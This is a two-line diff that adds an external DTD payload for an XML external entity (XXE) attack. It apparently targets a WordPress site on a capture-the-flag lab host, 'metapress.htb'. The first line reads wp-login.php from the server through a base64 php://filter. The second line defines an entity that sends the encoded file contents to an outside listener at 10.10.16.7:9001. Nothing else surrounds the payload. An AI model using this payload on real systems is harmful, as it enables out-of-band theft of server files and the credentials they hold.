@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-login.php">
+<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.7:9001/?p=%file;'>" >
